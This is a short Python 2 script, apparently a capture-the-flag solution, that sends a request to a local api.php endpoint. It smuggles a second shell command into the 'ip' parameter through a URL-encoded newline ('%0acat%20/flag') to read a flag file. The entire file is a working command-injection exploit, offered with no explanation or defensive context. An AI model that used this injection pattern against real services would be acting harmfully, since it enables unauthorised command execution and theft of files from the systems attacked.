#!/usr/bin/python2.7
#coding:utf-8

import requests
url = 'http://127.0.0.1:8080/api.php?ip=ipinfo.io%0acat%20/flag'
headers = {'User-Agent': 'Linux; Android 4.4.2;'}
r = requests.get(url, headers=headers)
print r.text